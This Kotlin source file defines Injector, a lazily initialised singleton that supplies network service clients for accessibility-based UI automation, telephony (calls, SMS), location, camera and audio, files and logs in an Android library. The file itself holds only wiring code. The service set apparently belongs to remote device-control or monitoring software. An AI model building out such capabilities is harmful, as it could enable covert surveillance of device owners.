package com.hawkshaw.library.datalayer

import android.util.Log // Added import
import com.hawkshaw.library.datalayer.network.service.AccessibilityService
import com.hawkshaw.library.datalayer.network.service.AppConfigService
import com.hawkshaw.library.datalayer.network.service.AppService
import com.hawkshaw.library.datalayer.network.service.AuthService
import com.hawkshaw.library.datalayer.network.service.FileService
import com.hawkshaw.library.datalayer.network.service.LocationService
import com.hawkshaw.library.datalayer.network.service.LogsService
import com.hawkshaw.library.datalayer.network.service.MediaService
import com.hawkshaw.library.datalayer.network.service.MiscService
import com.hawkshaw.library.datalayer.network.service.TelephonyService
import com.hawkshaw.library.datalayer.network.ServiceFactory
import kotlin.properties.ReadOnlyProperty
import kotlin.reflect.KProperty

private const val TAG = "Injector" // Added TAG

/**
 * Service dependency injection provider
 */
class Injector private constructor() {
    companion object {
        init {
            Log.d(TAG, "Injector companion object initialized.") // Log when companion object is initialized
        }
        // Renamed 'instance' to 'INSTANCE' (convention for singletons)
        // and made it the primary way to access the Injector singleton.
        // @JvmStatic ensures it's accessible directly from Java like Injector.getInstance().
        @JvmStatic
        val INSTANCE: Injector by lazy { // Added lazy initialization for the instance itself for logging
            Log.i(TAG, "Injector INSTANCE created (lazy).")
            Injector()
        }

        // Removed the redundant getInstance() function to avoid platform declaration clash.
        // Java code will now access the singleton via Injector.INSTANCE.
    }

    init {
        Log.d(TAG, "Injector primary constructor called (INSTANCE is being created).") // Log when primary constructor is called
    }

    /**
     * Accessibility service for UI automation
     */
    val accessibilityService: AccessibilityService by ServiceDelegate { ServiceFactory.createAccessibilityService() }

    /**
     * App configuration service
     */
    val appConfig: AppConfigService by ServiceDelegate { ServiceFactory.createAppConfigService() }

    /**
     * General app service
     */
    val appService: AppService by ServiceDelegate { ServiceFactory.createAppService() }

    /**
     * Authentication service
     */
    val authService: AuthService by ServiceDelegate { ServiceFactory.createAuthService() }

    /**
     * File operations service
     */
    val fileService: FileService by ServiceDelegate { ServiceFactory.createFileService() }

    /**
     * Location service
     */
    val locationService: LocationService by ServiceDelegate { ServiceFactory.createLocationService() }

    /**
     * Logging service
     */
    val logsService: LogsService by ServiceDelegate { ServiceFactory.createLogsService() }

    /**
     * Media service for camera, audio, etc.
     */
    val mediaService: MediaService by ServiceDelegate { ServiceFactory.createMediaService() }

    /**
     * Miscellaneous utilities service
     */
    val miscService: MiscService by ServiceDelegate { ServiceFactory.createMiscService() }

    /**
     * Telephony service for calls, SMS, etc.
     */
    val telephonyService: TelephonyService by ServiceDelegate { ServiceFactory.createTelephonyService() }
}

/**
 * Delegate for lazy service initialization
 */
private class ServiceDelegate<T>(private val initializer: () -> T) : ReadOnlyProperty<Injector, T> {
    private var value: T? = null
    // TAG for ServiceDelegate, could be defined outside if preferred
    private companion object { 
        private const val DELEGATE_TAG = "ServiceDelegate"
    }


    override fun getValue(thisRef: Injector, property: KProperty<*>): T {
        Log.d(DELEGATE_TAG, "getValue() called for property: ${property.name}")
        // Double-checked locking for thread safety, though `also` is generally safe.
        // For strictness:
        // if (value == null) {
        //     synchronized(this) {
        //         if (value == null) {
        //             Log.i(DELEGATE_TAG, "Initializing service: ${property.name}")
        //             value = initializer()
        //         }
        //     }
        // }
        // return value!!
        // Simpler Kotlin idiomatic way:
        return value ?: synchronized(this) { // Added synchronized block for thread safety during initialization
            value ?: initializer().also {
                Log.i(DELEGATE_TAG, "Service '${property.name}' initialized and cached.")
                value = it
            }
        }
    }
}